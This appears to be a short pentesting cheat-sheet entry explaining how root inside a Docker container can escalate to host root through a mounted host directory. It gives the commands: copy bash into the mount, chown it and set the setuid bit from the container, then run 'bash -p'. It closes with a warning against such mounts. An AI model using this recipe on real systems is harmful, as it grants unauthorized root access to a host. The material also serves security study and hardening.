

---

## Mounting Host Directory in a Docker Container (PrivEsc)
Root in a container is not real root.
It's fake root.

But if a directory is mounted in a container, and you have root in that
container, then you can create files in that directory that will then
be owned by root.


```bash
# On the host:
cp /bin/bash ./rootbash

# In the container as root:
chown root ./rootbash
chmod +s ./rootbash
```
Setting the `s` bit on a file makes it `setuid` and `setgid`.
* `SUID` - Executed using the owner's perms
* `SGID` - Executed using the group's perms

Running bash with `-p` will let you run bash with the GUID/SUID
bash -p 
<- 

tl;dr: 
Mounting a directory from the host into a container is a security risk.  
Don't have any Docker containers mount direcories that are on the host.  

---
